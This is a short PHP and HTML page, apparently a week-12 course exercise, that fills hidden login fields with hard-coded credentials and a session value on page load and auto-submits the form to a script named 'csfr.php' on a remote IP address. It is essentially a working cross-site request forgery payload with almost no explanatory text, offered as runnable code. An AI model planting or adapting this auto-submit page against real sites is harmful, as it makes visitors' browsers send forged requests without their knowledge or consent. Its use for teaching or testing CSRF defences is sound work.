<?php
  session_start(); // start the session
  $_SESSION['confirmation'] = rand(); // create a session variable and give it a random value
?>

<script>
  function submitLoginForm() {

    document.getElementById("user").value = "host";
    document.getElementById("password").value = "pass";
    
    // add the confirmation session variable value as a hidden form field
    var confirmationInput = document.createElement("input");
    confirmationInput.setAttribute("type", "hidden");
    confirmationInput.setAttribute("name", "confirmation");
    confirmationInput.setAttribute("value", "<?php echo $_SESSION['confirmation']; ?>");
    document.login.appendChild(confirmationInput);

    document.login.submit();
  }
</script>

<body onload="submitLoginForm();">
  <div id='msg'></div><br />
  <form name="login" method="POST" action="http://146.190.188.35/wk12/csfr.php">
    <label for="user1">Username:</label><br />
    <input type="text" id="user1" name="user1"><br />
    <label for="password1">Password:</label><br />
    <input type="password" id="password1" name="password1"><br /><br />
    <input type="hidden" id="user" value="" name="user" />
    <input type="hidden" id="password" value="" name="password" />     
    <input type="submit" value="Submit">
  </form>
</body>
